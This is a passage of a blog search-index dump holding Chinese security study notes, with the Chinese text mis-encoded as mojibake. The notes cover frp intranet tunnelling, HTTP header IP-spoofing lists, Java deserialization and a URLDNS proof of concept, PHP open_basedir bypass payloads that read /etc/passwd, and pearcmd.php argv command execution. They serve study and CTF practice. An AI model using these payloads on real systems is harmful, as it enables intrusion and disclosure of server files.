ä¸ºå½“æ—¶æ¯”èµ›ä¸å¯ä»¥è”ç½‘ï¼Œåªèƒ½å°†å®¿ä¸»æœºï¼Œä¹Ÿå°±æ˜¯windowså½“ä½œä»£ç†æœåŠ¡å™¨ï¼Œå¦‚æœå¯ä»¥è”ç½‘ï¼Œå°†è‡ªå·±çš„vpså½“ä½œä»£ç†æœåŠ¡å™¨å³å¯ 12345678[common]server_addr = 192.168.0.55server_port = 7000[socks5]type = tcpplugin = socks5 remote_port = 5000 ä¿®æ”¹æˆåŠŸåï¼Œç»™frpcåŠ å¯æ‰§è¡Œæƒé™ 1chmod +x ./frpc å¹¶æ‰§è¡Œ 1./frpc -c frpc.ini ç„¶åå†æ”»å‡»æœºwindowsä¸Šæ‰§è¡Œ 1frps -c frps.ini å¯ä»¥çœ‹åˆ°successï¼Œä»£è¡¨æˆåŠŸäº†ã€‚è®©æˆ‘ä»¬ç”¨æµè§ˆå™¨è®¿é—®ä¸€ä¸‹ï¼› å½“ç„¶æµè§ˆå™¨è¿˜ä¸å¯ä»¥ç›´æ¥è®¿é—®ï¼Œéœ€è¦å€ŸåŠ©ä»£ç†æ’ä»¶ï¼Œfirefoxæœ€å¸¸ç”¨çš„è«éå°±æ˜¯FoxyProxyäº†ï¼Œå½“ç„¶chromeæµè§ˆå™¨ä¹Ÿæœ‰å¯¹åº”çš„æ’ä»¶ï¼› é…ç½®å¤§æ¦‚å¦‚ä¸‹ æ¥ç€æµè§ˆå™¨è¾“å…¥ï¼Œå³å¯è®¿é—®æˆåŠŸäº†ï¼Œ(æˆ‘è¿™é‡Œä¸¤ä¸ªå®¹å™¨ç”¨çš„æ˜¯ä¸€ä¸ªé•œåƒï¼Œå†…å®¹æ˜¯ä¸€æ ·çš„)ï¼› 1http://172.17.0.3/ åˆ°è¿™é‡Œåˆ©ç”¨frpå®ç°å†…ç½‘ç©¿é€çš„å®éªŒåŸºæœ¬å°±åšå®Œäº†ï¼Œå½“ç„¶ï¼Œåœ¨å®æˆ˜ä¸­ï¼Œæƒ…å†µæ˜¯åƒå˜ä¸‡åŒ–çš„ï¼›é¢å¯¹ä¸åŒçš„æƒ…å†µéœ€è¦åšå‡ºç›¸åº”çš„æ”¹å˜ï¼› å¯ä»¥çœ‹åˆ°ï¼Œå†…ç½‘ç©¿é€çš„å®ç°åŸºæœ¬æ˜¯å€Ÿç”¨å·¥å…·å®Œæˆçš„ï¼›å¹¶æ²¡æœ‰è®©æˆ‘ä»¬æ•²å¾ˆå¤šä»£ç å•¥çš„ï¼› è¿™é‡Œæ¥ç€ä»‹ç»ä¸€æ¬¾å·¥å…·ï¼šproxifier å…·ä½“åŠŸèƒ½ï¼šå…è®¸ç”¨æˆ·æ— éœ€å¯¹æ¯ä¸ªåº”ç”¨ç¨‹åºè¿›è¡Œå•ç‹¬çš„é…ç½®ï¼Œå°±èƒ½é€šè¿‡ä»£ç†æœåŠ¡å™¨æˆ–é˜²ç«å¢™è¿›è¡Œç½‘ç»œè¿æ¥ï¼Œå› è€Œå—åˆ°å¹¿æ³›æ¬¢è¿ã€‚ åœ¨ä¸€äº›æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯èƒ½éœ€è¦å€ŸåŠ©pythonçš„è„šæœ¬ä»è€Œå®ç°æ”»å‡»ï¼›è¿™ç§æƒ…å†µç®€ç›´å¤ªå¸¸è§äº†ï¼Œæˆ‘ä»¬æ€ä¹ˆä½¿pythoné€šè¿‡ä»£ç†å¯ä»¥è®¿é—®å†…ç½‘ç©¿é€çš„é¶æœºäº†ï¼Œè¿™å°±éœ€è¦å€ŸåŠ©proxifierå·¥å…· è¿™æ ·è®¾ç½®ï¼Œæ‰€æœ‰åº”ç”¨éƒ½ä¼šèµ°æˆ‘ä»¬è®¾ç½®çš„ä»£ç†ï¼Œå¦‚æœä½ å¸Œæœ›ä¸€äº›åº”ç”¨ä¸èµ°ä»£ç†ï¼Œåªéœ€è¦å¯¹åº”è®¾ç½®ä¸€ä¸‹ä»£ç†è§„åˆ™å³å¯ï¼Œ 1234567891011import requestsurl = &quot;http://172.17.0.3/&quot;response = requests.get(url=url)if (response.status_code == 200): print(&quot;success&quot;)else: print(&quot;fail&quot;)#success å¼€å¯proxifierï¼›å³ä½¿æˆ‘çš„Chromeæ²¡æœ‰å¼€å¯frpä»£ç†ï¼Œä¾ç„¶å¯ä»¥è®¿é—®; æ³¨æ„ï¼šproxifieræœ€å¥½ä½¿ç”¨Standardç‰ˆæœ¬ï¼›ä¸è¦ä½¿ç”¨Portableç‰ˆæœ¬ï¼›å¯èƒ½ä¼šæœ‰é—®é¢˜(ä¸€å¼€å§‹æˆ‘ç”¨Portableç‰ˆæœ¬ï¼Œå³ä½¿ä»£ç†è§„åˆ™å’Œä»£ç†æœåŠ¡å™¨æ²¡æœ‰é”™è¯¯ï¼Œpythonå’Œå…¶ä»–åº”ç”¨ç¨‹åºå§‹ç»ˆè®¿é—®ä¸äº†172.17.0.3,ç›´åˆ°æ¢æˆStandardç‰ˆæœ¬)ï¼› åˆ°è¿™é‡Œï¼Œfrp+proxifierå†…ç½‘ç©¿é€çš„ç¬”è®°å·²ç»è®°å½•å®Œæˆï¼Œä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæˆ‘è¿™ä¸ªå®éªŒæ¯”è¾ƒç®€å•ï¼Œåœ¨å®æˆ˜ä¸­ï¼Œå¾€å¾€æ²¡æœ‰è¿™ä¹ˆç®€å•ï¼Œéœ€è¦å†·é™åˆ†æï¼Œä»è€Œåˆ°è¾¾æ•ˆæœã€‚","link":"/2024/01/25/frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"},{"title":"http-headerä¼ªé€ ip","text":"123456789Client-IP: 127.0.0.1X-Client-IP: 127.0.0.1X-Real-IP: 127.0.0.1True-Client-IP: 127.0.0.1X-Originating-IP: 127.0.0.1X-Forwarded-For: 127.0.0.1X-Remote-IP: 127.0.0.1X-Remote-Addr: 127.0.0.1X-Forwarded-Host: 127.0.0.1","link":"/2024/01/30/http-header%E4%BC%AA%E9%80%A0ip/"},{"title":"Javaååºåˆ—åŒ–åŸºç¡€","text":"é‡å†™readObjectæ¥æ‰§è¡Œå‘½ä»¤12345678910111213141516171819202122232425262728293031323334353637383940414243444546//Studentpackage test;import java.io.IOException;import java.io.Serializable;public class Student implements Serializable { public String name; public int age; public Student() { } public Student(String name, int age) { this.name = name; this.age = age; } public String getName() { return name; } public void setName(String name) { this.name = name; } public int getAge() { return age; } public void setAge(int age) { this.age = age; }// @Override public String toString() { // è¿”å›å¯¹è±¡çš„å­—ç¬¦ä¸²è¡¨ç¤º return &quot;Student{&quot; + &quot;name='&quot; + name + '\\'' + &quot;, age=&quot; + age + '}'; } //é‡å†™readObject private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException{ //æ‰§è¡Œé»˜è®¤çš„readObject()æ–¹æ³• in.defaultReadObject(); //æ‰§è¡Œå‘½ä»¤ Runtime.getRuntime().exec(&quot;calc.exe&quot;); }} 1234567891011121314151617//Serializepackage test;import java.io.FileOutputStream;import java.io.IOException;import java.io.ObjectOutputStream;public class abc { public static void main(String[] args) throws IOException { Student stu = new Student(&quot;lisi&quot;,18); ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;a.txt&quot;)); oos.writeObject(stu); System.out.println(stu); oos.close(); }} 1234567891011121314151617181920//Unserializepackage test;import java.io.FileInputStream;import java.io.IOException;import java.io.ObjectInputStream;public class unseralize { public static void main(String[] args) throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;a.txt&quot;)); Object o = ois.readObject(); System.out.println(o); ois.close(); }} Java(åå°„åŸºç¡€)Javaåå°„æ˜¯æŒ‡åœ¨è¿è¡Œæ—¶åŠ¨æ€åœ°è·å–ã€æ£€æŸ¥å’Œæ“ä½œç±»çš„ä¿¡æ¯çš„æœºåˆ¶ã€‚å®ƒå…è®¸ç¨‹åºåœ¨è¿è¡Œæ—¶é€šè¿‡ç±»çš„åç§°æ¥è·å–ç±»çš„è¯¦ç»†ä¿¡æ¯ï¼ŒåŒ…æ‹¬ç±»çš„æ„é€ å‡½æ•°ã€æ–¹æ³•ã€å­—æ®µç­‰ï¼Œå¹¶ä¸”å¯ä»¥åœ¨è¿è¡Œæ—¶åŠ¨æ€åœ°åˆ›å»ºå¯¹è±¡ã€è°ƒç”¨æ–¹æ³•å’Œè®¿é—®å­—æ®µã€‚åå°„æœºåˆ¶ä½¿å¾—ç¨‹åºå¯ä»¥åœ¨ç¼–è¯‘æ—¶æ— æ³•ç¡®å®šå…·ä½“ç±»çš„æƒ…å†µä¸‹ï¼Œé€šè¿‡åç§°æ¥æ“ä½œç±»ï¼Œä»è€Œæä¾›äº†æ›´å¤§çš„çµæ´»æ€§å’ŒåŠ¨æ€æ€§ã€‚ åå°„è·å–classå¯¹è±¡1234567891011121314151617181920public class test01 { public static void main(String[] args) throws ClassNotFoundException { /* è·å–classå¯¹è±¡çš„ä¸‰ç§æ–¹å¼ Class.forName(&quot;å…¨ç±»å&quot;) å…¨ç±»åï¼šåŒ…å+ç±»å ç±»å.class å¯¹è±¡ã€‚getClass() */ Class clazz01 = Class.forName(&quot;Student&quot;); System.out.println(clazz01); Class clazz02 = Student.class; System.out.println(clazz02); Student s = new Student(); Class clazz03 = s.getClass(); System.out.println(clazz03); }} åå°„è·å–æ„é€ æ–¹æ³•123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263import java.lang.reflect.Constructor;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Parameter;public class test01 { public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException { /* Classç±»ä¸­ç”¨äºè·å–æ„é€ æ–¹æ³•çš„æ–¹æ³• Classç±»ä¸­ç”¨äºè·å–æ„é€ æ–¹æ³•çš„æ–¹æ³• Constructor&lt;?&gt;[]getConstructors():è¿”å›æ‰€æœ‰å…¬å…±æ„é€ æ–¹æ³•å¯¹è±¡çš„æ•°ç»„ Constructor&lt;?&gt;[]getDeclaredConstructors():è¿”å›æ‰€æœ‰æ„é€ æ–¹æ³•å¯¹è±¡çš„æ•°ç»„ Constructor&lt;T&gt;getConstructor(Class&lt;?&gt;â€¦parameterTypes):è¿”å›å•ä¸ªå…¬å…±æ„é€ æ–¹æ³•å¯¹è±¡ Constructor&lt;-T&gt;getDeclaredConstructor((Class&lt;?&gt;parameterTypes):è¿”å›å•ä¸ªæ„é€ æ–¹æ³•å¯¹è±¡ */ //è·å–Classå­—èŠ‚ç æ–‡ä»¶å¯¹è±¡ Class clazz = Class.forName(&quot;Student&quot;); System.out.println(&quot;è·å–æ‰€æœ‰æ„é€ æ–¹æ³•&quot;); Constructor[] con = clazz.getDeclaredConstructors(); for (Constructor constructor : con) { System.out.println(constructor.toString()); } System.out.println(&quot;è·å–æ— å‚çš„æ„é€ æ–¹æ³•&quot;); Constructor con1 = clazz.getConstructor(); System.out.println(con1); System.out.println(&quot;è·å–å‚æ•°ä¸ºStringç±»å‹çš„æ„é€ æ–¹æ³•&quot;); Constructor con2 = clazz.getDeclaredConstructor(String.class); System.out.println(con2); System.out.println(&quot;è·å–å‚æ•°ä¸ºintç±»å‹çš„æ„é€ æ–¹æ³•&quot;); Constructor con3 = clazz.getDeclaredConstructor(int.class); System.out.println(con3); System.out.println(&quot;è·å–å‚æ•°ä¸ºStingç±»å‹å’Œintç±»å‹çš„æ„é€ æ–¹æ³•&quot;); Constructor con4 = clazz.getDeclaredConstructor(String.class,int.class); System.out.println(con4); System.out.println(&quot;è·å–æ„é€ æ–¹æ³•çš„æƒé™ä¿®é¥°ç¬¦&quot;); /* public : 1 protected : 4 private : 2 */ int modifiers = con4.getModifiers(); System.out.println(modifiers); System.out.println(&quot;è·å–æ„é€ æ–¹æ³•çš„å‚æ•°&quot;); Parameter[] parameters = con4.getParameters(); for(Parameter parameter : parameters){ System.out.println(parameter); } System.out.println(&quot;åˆ›å»ºå¯¹è±¡&quot;); con4.setAccessible(true); Object stu = con4.newInstance(&quot;å¼ ä¸‰&quot;, 18); System.out.println(stu); }} åå°„è·å–æˆå‘˜å˜é‡1234567891011121314151617181920212223242526272829303132333435363738394041424344import java.lang.reflect.Field;public class test02 { public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException { /* Field[] getFields():è¿”å›æ‰€æœ‰å…¬å…±æˆå‘˜å˜é‡å¯¹è±¡çš„æ•°ç»„ Field[] getDeclaredFields():è¿”å›æ‰€æœ‰æˆå‘˜å˜é‡å¯¹è±¡çš„æ•°ç»„ Field getField(String name):è¿”å›å•ä¸ªå…¬å…±æˆå‘˜å˜é‡å¯¹è±¡ Field getDeclaredField(String name):è¿”å›å•ä¸ªæˆå‘˜å˜é‡å¯¹è±¡ */ System.out.println(&quot;è·å–classå­—èŠ‚ç æ–‡ä»¶å¯¹è±¡&quot;); Class clazz = Class.forName(&quot;Student&quot;); System.out.println(&quot;è·å–æ‰€æœ‰æˆå‘˜å˜é‡å¯¹è±¡&quot;); Field[] fields = clazz.getDeclaredFields(); for (Field field :fields){ System.out.println(field); } System.out.println(&quot;è·å–nameæˆå‘˜å˜é‡&quot;); Field name = clazz.getDeclaredField(&quot;name&quot;); System.out.println(name); System.out.println(&quot;è·å–æƒé™ä¿®é¥°ç¬¦&quot;); int modifiers = name.getModifiers(); System.out.println(modifiers); System.out.println(&quot;è·å–Name&quot;); String n = name.getName(); System.out.println(n); System.out.println(&quot;è·å–æˆå‘˜å˜é‡è®°å½•çš„å€¼&quot;); Student s = new Student(&quot;æå››&quot;,18,&quot;ç”·&quot;); name.setAccessible(true); Object value = name.get(s); System.out.println(value); System.out.println(&quot;ä¿®æ”¹æˆå‘˜å˜é‡è®°å½•çš„å€¼&quot;); name.set(s,&quot;å¼ ä¸‰&quot;); Object value2 = name.get(s); System.out.println(value2); }} URLDNSpoc1234567891011121314151617181920212223242526272829303132import java.io.FileNotFoundException;import java.io.FileOutputStream;import java.io.IOException;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.net.MalformedURLException;import java.net.URL;import java.util.HashMap;public class Serialize { public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException { HashMap&lt;URL, Integer&gt; hashmap = new HashMap&lt;URL, Integer&gt;(); URL url = new URL(&quot;http://9t3yg0l28pe8p1dypavjbhwf66cx0o1cq.oastify.com&quot;); Class c = url.getClass(); Field hashcodefield = c.getDeclaredField(&quot;hashCode&quot;); hashcodefield.setAccessible(true); hashcodefield.set(url,2); //åœ¨hashmap.putä¸­è°ƒç”¨äº†putVal() hashmap.put(url, 1); ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;a.bin&quot;)); hashcodefield.set(url,-1); oos.writeObject(hashmap); oos.close(); }} 12345678910111213import java.io.FileInputStream;import java.io.FileNotFoundException;import java.io.IOException;import java.io.ObjectInputStream;public class unSerialize { public static void main(String[] args) throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;a.bin&quot;)); ois.readObject(); ois.close(); }} pop gadget12345Gadget Chain: HashMap.readObject() HashMap.putVal() HashMap.hash() URL.hashCode() å¯ä»¥ç†è§£ä¸º, åœ¨åºåˆ—åŒ– HashMap ç±»çš„å¯¹è±¡æ—¶, ä¸ºäº†å‡å°åºåˆ—åŒ–åçš„å¤§å°, å¹¶æ²¡æœ‰å°†æ•´ä¸ªå“ˆå¸Œè¡¨ä¿å­˜è¿›å», è€Œæ˜¯ä»…ä»…ä¿å­˜äº†æ‰€æœ‰å†…éƒ¨å­˜å‚¨çš„ key å’Œ value. æ‰€ä»¥åœ¨ååºåˆ—åŒ–æ—¶, éœ€è¦é‡æ–°è®¡ç®—æ‰€æœ‰ key çš„ hash, ç„¶åä¸ value ä¸€èµ·æ”¾å…¥å“ˆå¸Œè¡¨ä¸­. è€Œæ°å¥½, URL è¿™ä¸ªå¯¹è±¡è®¡ç®— hash çš„è¿‡ç¨‹ä¸­ç”¨äº† getHostAddress æŸ¥è¯¢äº† URL çš„ä¸»æœºåœ°å€, è‡ªç„¶éœ€è¦å‘å‡º DNS è¯·æ±‚. æˆ‘åœ¨å­¦ä¹ URLDNSä¸­é‡åˆ°ä¸€ä¸ªé—®é¢˜ï¼šå°½ç®¡æˆ‘setAccessible(true);è¿˜æ˜¯ä¼šæŠ¥é”™ï¼š Unable to make field private int java.net.URL.hashCode accessible: module java.base does not â€œopens java.netâ€ to unnamed module @5b480cf9,è§£å†³æ–¹æ³•ï¼šæ›´æ¢jdkç‰ˆæœ¬åˆ°1.8 åŠ¨æ€ä»£ç†åœ¨Javaä¸­ï¼ŒåŠ¨æ€ä»£ç†æ˜¯ä¸€ç§æœºåˆ¶ï¼Œå®ƒå…è®¸åœ¨è¿è¡Œæ—¶åˆ›å»ºä»£ç†å¯¹è±¡ï¼Œä»¥ä»£æ›¿åŸå§‹å¯¹è±¡æ‰§è¡Œç‰¹å®šçš„æ“ä½œã€‚ä»£ç†å¯¹è±¡å¯ä»¥æ‹¦æˆªå¯¹åŸå§‹å¯¹è±¡çš„æ–¹æ³•è°ƒç”¨ï¼Œå¹¶åœ¨è°ƒç”¨å‰åæ‰§è¡Œé¢å¤–çš„é€»è¾‘ã€‚ åœ¨Javaä¸­ï¼ŒåŠ¨æ€ä»£ç†æ˜¯é€šè¿‡java.lang.reflect.Proxyç±»å’Œjava.lang.reflect.InvocationHandleræ¥å£æ¥å®ç°çš„ã€‚Proxyç±»æä¾›äº†åˆ›å»ºä»£ç†å¯¹è±¡çš„é™æ€æ–¹æ³•ï¼Œè€ŒInvocationHandleræ¥å£å®šä¹‰äº†ä»£ç†å¯¹è±¡çš„æ–¹æ³•è°ƒç”¨å¤„ç†é€»è¾‘ã€‚ ä¸€ä¸ªç®€å•çš„æ¡ˆä¾‹ åˆ›å»ºè¦è¢«ä»£ç†çš„class123456789101112131415161718192021222324252627282930public class BigStart implements Star{ private String name; public BigStart() { } public BigStart(String name) { this.name = name; } public String getName() { return name; } public void setName(String name) { this.name = name; } public String sing(String name){ System.out.println(this.name+&quot;æ­£åœ¨å”±&quot;+name); return &quot;è°¢è°¢&quot;; } public void dance(){ System.out.println(this.name+&quot;æ­£åœ¨è·³èˆ&quot;); }} åˆ›å»ºæ¥å£12345678public interface Star { //å¯ä»¥æŠŠæƒ³è¦è¢«ä»£ç†çš„æ–¹æ³•æ”¾åˆ°æ¥å£å½“ä¸­ public abstract String sing(String name); public abstract void dance();} åˆ›å»ºä»£ç†1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;import java.lang.reflect.Proxy;public class ProxyuUtil { /* æ–¹æ³•çš„ä½œç”¨ï¼š ç»™æ˜æ˜Ÿåˆ›å»ºä»£ç† å½¢å‚ï¼š è¢«ä»£ç†çš„æ˜æ˜Ÿ éœ€æ±‚ï¼š å¤–é¢çš„äººæƒ³è¦å¤§æ˜æ˜Ÿå”±ä¸€é¦–æ­Œ 1.è·å–ä»£ç†çš„å¯¹è±¡ ä»£ç†å¯¹è±¡=ProxyUtil,createProxy(å¤§æ˜æ˜Ÿçš„å¯¹è±¡)ï¼› 2,å†è°ƒç”¨ä»£ç†çš„å”±æ­Œæ–¹æ³• ä»£ç†å¯¹è±¡.å”±æ­Œçš„æ–¹æ³•()ï¼› */ public static Star createProxy(BigStart bigStart) { /* public static object newProxyInstance(ClassLoader loader,Class&lt;?&gt;[]interfaces,InvocationHandler h) å‚æ•°ä¸€ï¼šç”¨äºæŒ‡å®šç”¨å“ªä¸ªç±»åŠ è½½å™¨ï¼Œå»åŠ è½½ç”Ÿæˆçš„ä»£ç†ç±» å‚æ•°äºŒï¼šæŒ‡å®šæ¥å£ï¼Œè¿™äº›æ¥å£ç”¨äºæŒ‡å®šç”Ÿæˆçš„ä»£ç†é•¿ä»€ä¹ˆï¼Œä¹Ÿå°±æ˜¯æœ‰å“ªäº›æ–¹æ³• å‚æ•°ä¸‰ï¼šç”¨æ¥æŒ‡å®šç”Ÿæˆçš„ä»£ç†å¯¹è±¡è¦å¹²ä»€ä¹ˆäº‹æƒ… */ Star star = (Star) Proxy.newProxyInstance( ProxyuUtil.class.getClassLoader(), new Class[]{Star.class}, new InvocationHandler() { @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { /* å‚æ•°ä¸€ï¼šä»£ç†çš„å¯¹è±¡ å‚æ•°äºŒï¼šè¦è¿è¡Œçš„æ–¹æ³• å‚æ•°ä¸‰ï¼šè°ƒç”¨æ–¹æ³•æ—¶ï¼Œè¦ä¼ è¾“çš„å½¢å‚ */ if(&quot;sign&quot;.equals(method.getName())){ System.out.println(&quot;å‡†å¤‡è¯ç­’&quot;); } else if(&quot;dance&quot;.equals(method.getName())){ System.out.println(&quot;å‡†å¤‡åœºåœ°&quot;); } return method.invoke(bigStart,args); } } ); return star; }} æµ‹è¯•ä»£ç†123456789101112131415161718192021public class test { public static void main(String[] args) { //1. è·å–ä»£ç†å¯¹è±¡ BigStart bigStart = new BigStart(&quot;é¸¡å“¥&quot;); Star proxy = ProxyuUtil.createProxy(bigStart); //2. è°ƒç”¨å”±æ­Œçš„æ–¹æ³• String result = proxy.sing(&quot;é¸¡ä½ å¤ªç¾&quot;); System.out.println(result); //3. è°ƒç”¨è·³èˆçš„æ–¹æ³• proxy.dance(); }}//è¾“å‡ºå¦‚ä¸‹ï¼š//é¸¡å“¥æ­£åœ¨å”±é¸¡ä½ å¤ªç¾//è°¢è°¢//å‡†å¤‡åœºåœ°//é¸¡å“¥æ­£åœ¨è·³èˆ","link":"/2023/11/01/java(unserialize)/"},{"title":"open_basedir","text":"open_basediræ˜¯ä»€ä¹ˆ?open_basediræ˜¯PHPçš„ä¸€ä¸ªå®‰å…¨ç‰¹æ€§ï¼Œç”¨äºé™åˆ¶PHPè„šæœ¬èƒ½å¤Ÿè®¿é—®çš„æ–‡ä»¶å’Œç›®å½•ã€‚å½“open_basedirè¢«è®¾ç½®æ—¶ï¼ŒPHPè„šæœ¬åªèƒ½è®¿é—®æŒ‡å®šçš„ç›®å½•ï¼Œè€Œä¸èƒ½è®¿é—®å…¶ä»–ç›®å½•ã€‚è¿™æœ‰åŠ©äºå¢åŠ æœåŠ¡å™¨çš„å®‰å…¨æ€§ï¼Œé˜²æ­¢æ¶æ„è„šæœ¬è®¿é—®ç³»ç»Ÿä¸­çš„æ•æ„Ÿæ–‡ä»¶ã€‚ æ³¨æ„ï¼š open_basedir æŒ‡å®šçš„é™åˆ¶å®é™…ä¸Šæ˜¯å‰ç¼€ è€Œä¸æ˜¯ ç›®å½•å,ä¸¾ä¸ªä¾‹å­ï¼Œ è‹¥â€œopen_basedirâ€ = /tmp/zixydé‚£ä¹ˆç›®å½•/tmp/zixydå’Œ /tmp/zixyd1 éƒ½æ˜¯å¯ä»¥è®¿é—®çš„ã€‚ å‘½ä»¤å‡½æ•°ç»•è¿‡open_basedirå¯¹systemç­‰ä¸€äº›å‘½ä»¤å‡½æ•°æ²¡æœ‰é™åˆ¶ï¼Œ symlinkç»•è¿‡è¿™ç§æŠ€å·§æ„Ÿè§‰ä¸éš¾ç†è§£ï¼›åªè¦è‡ªå·±è®¤çœŸæƒ³ä¸€ä¸‹å³å¯ï¼› 12345678910111213141516171819&lt;?phpmkdir(&quot;A&quot;);chdir(&quot;A&quot;);mkdir(&quot;B&quot;);chdir(&quot;B&quot;);mkdir(&quot;C&quot;);chdir(&quot;C&quot;);mkdir(&quot;D&quot;);chdir(&quot;D&quot;);chdir(&quot;..&quot;);chdir(&quot;..&quot;);chdir(&quot;..&quot;);chdir(&quot;..&quot;); //è¦è¯»çš„æ–‡ä»¶éœ€è¦å¾€å‰è·¨å¤šå°‘è·¯å¾„ï¼Œå°±å¾—åˆ›å»ºå¤šå°‘å±‚çš„å­ç›®å½•ï¼Œç„¶åè¾“å…¥å¤šå°‘ä¸ª../æ¥è®¾ç½®ç›®æ ‡æ–‡ä»¶ã€‚symlink(&quot;A/B/C/D&quot;,&quot;zixyd&quot;); //zixyd -&gt; A/B/C/D symlink(&quot;zixyd/../../../../etc/passwd&quot;,&quot;exp&quot;); //exp -&gt; zixyd/../../../../etc/passwdunlink(&quot;zixyd&quot;); //è¿™ä¸¤æ­¥æ“ä½œæ˜¯è¿™ä¸ªæŠ€å·§çš„ç²¾åæ‰€åœ¨;æœ‰ç§å·æ¢æ¢æŸ±çš„æ„Ÿè§‰mkdir(&quot;zixyd&quot;);?&gt; æœ€ç»ˆpayload;åœ¨è®¿é—®expæ–‡ä»¶ï¼Œå³å¯å¾—åˆ°/etc/passwd 1mkdir(&quot;A&quot;);chdir(&quot;A&quot;);mkdir(&quot;B&quot;);chdir(&quot;B&quot;);mkdir(&quot;C&quot;);chdir(&quot;C&quot;);mkdir(&quot;D&quot;);chdir(&quot;D&quot;);chdir(&quot;..&quot;);chdir(&quot;..&quot;);chdir(&quot;..&quot;);chdir(&quot;..&quot;);symlink(&quot;A/B/C/D&quot;,&quot;zixyd&quot;);symlink(&quot;zixyd/../../../../etc/passwd&quot;,&quot;exp&quot;);unlink(&quot;zixyd&quot;);mkdir(&quot;zixyd&quot;); chdir()ä¸ini_set()ç»„åˆè¿™ä¸ªæŠ€å·§ä¸»è¦æ˜¯open_basedirè‡ªèº«çš„ç¼ºé™·é€ æˆçš„ï¼› ini_set('open_basedir','..');ï¼Œopen_basedir=..çš„æ„æ€æ˜¯é™åˆ¶ PHP è„šæœ¬åªèƒ½è®¿é—®ç›®å½• .. åŠå…¶å­ç›®å½•ä¸­çš„æ–‡ä»¶ï¼Œå¯¹å…¶ä»–ç›®å½•çš„æ–‡ä»¶è¿›è¡Œæ“ä½œå°†è¢«ç¦æ­¢,ä½†æ˜¯..ä»£è¡¨çš„ä¸Šä¸€çº§ç›®å½•ï¼Œçœ‹ä¼¼ç›®å½•ç¼©å°äº†ï¼Œå…¶å®æ˜¯æ‰©å¤§äº†ï¼› 123456789101112&lt;?phpmkdir('zixyd');chdir('zixyd');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..'); ini_set('open_basedir','/');//æœ€åè¦å°†..ä¿®æ”¹ä¸º/ï¼›å¦åˆ™æ— æ³•è®¿é—®æ ¹ç›®å½•çš„æ–‡ä»¶echo file_get_contents('/etc/passwd');?&gt; æœ€ç»ˆpayload(ä½†æ˜¯æˆ‘åœ¨ä¸€äº›php8çš„é«˜ç‰ˆæœ¬æ²¡æœ‰æˆåŠŸï¼Œä¼°è®¡æ˜¯ä¿®å¤äº†) 1mkdir('zixyd');chdir('zixyd');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');echo file_get_contents('/etc/passwd');","link":"/2024/01/27/open_basedir%E7%BB%95%E8%BF%87/"},{"title":"pearcmd.php","text":"register_argc_argvå½“php.iniä¸­register_argc_argvæ˜¯onæ—¶ï¼Œ$_SERVER['argv']å¯ä»¥è·å¾—å‘½ä»¤è¡Œå‚æ•°ã€‚ register_argc_argvé»˜è®¤æ˜¯off,æ‰€ä»¥åœ¨æœ¬åœ°åšå®éªŒæ—¶,éœ€è¦è‡ªå·±ä¿®æ”¹ä¸€ä¸‹php.iniï¼› åˆ›å»ºä¸€ä¸ªtest.phpå†…å®¹å¦‚ä¸‹ 123456789101112&lt;?phphighlight_file(__FILE__);var_dump($_SERVER['argv']);echo &quot;&lt;/br&gt;&quot;;echo $_SERVER['argc'].&quot;&lt;/br&gt;&quot;;$_SERVER['argv'][0]($_SERVER['argv'][1]);phpinfo()?&gt; æˆåŠŸæ‰§è¡Œå‘½ä»¤ ä¹Ÿå¯ä»phpinfoä¸­çœ‹å‡º$_SERVER['argv']çš„å€¼ pearcmd.phppear,peclpearå’Œpecléƒ½æ˜¯ä¸PHPæ‰©å±•ç›¸å…³çš„å·¥å…·ã€‚PEARï¼ˆPHP Extension and Application Repositoryï¼‰æ˜¯ä¸€ä¸ªPHPæ‰©å±•å’Œåº”ç”¨ç¨‹åºçš„å­˜å‚¨åº“ï¼Œå®ƒå…è®¸ç”¨æˆ·è½»æ¾åœ°å®‰è£…å’Œç®¡ç†PHPä»£ç ã€‚PECLï¼ˆPHP Extension Community Libraryï¼‰æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„é¡¹ç›®ï¼Œå®ƒæä¾›äº†ä¸€äº›PHPæ‰©å±•ï¼Œè¿™äº›æ‰©å±•é€šå¸¸ä¸åŒ…å«åœ¨PHPçš„æ ¸å¿ƒå‘è¡Œç‰ˆä¸­ã€‚PECLä¸­çš„æ‰©å±•é€šå¸¸éœ€è¦é€šè¿‡PECLå·¥å…·æ¥å®‰è£…å’Œç®¡ç†ã€‚å› æ­¤ï¼ŒPEARå’ŒPECLéƒ½æ˜¯ç”¨äºç®¡ç†PHPæ‰©å±•çš„å·¥å…·ï¼Œä½†å®ƒä»¬çš„å†…å®¹å’Œç”¨é€”ç•¥æœ‰ä¸åŒã€‚ æ¥è‡ªpç¥ï¼špeclæ˜¯PHPä¸­ç”¨äºç®¡ç†æ‰©å±•è€Œä½¿ç”¨çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œè€Œpearæ˜¯peclä¾èµ–çš„ç±»åº“ã€‚åœ¨7.3åŠä»¥å‰ï¼Œpecl/pearæ˜¯é»˜è®¤å®‰è£…çš„ï¼›åœ¨7.4åŠä»¥åï¼Œéœ€è¦æˆ‘ä»¬åœ¨ç¼–è¯‘PHPçš„æ—¶å€™æŒ‡å®š--with-pearæ‰ä¼šå®‰è£…ã€‚ 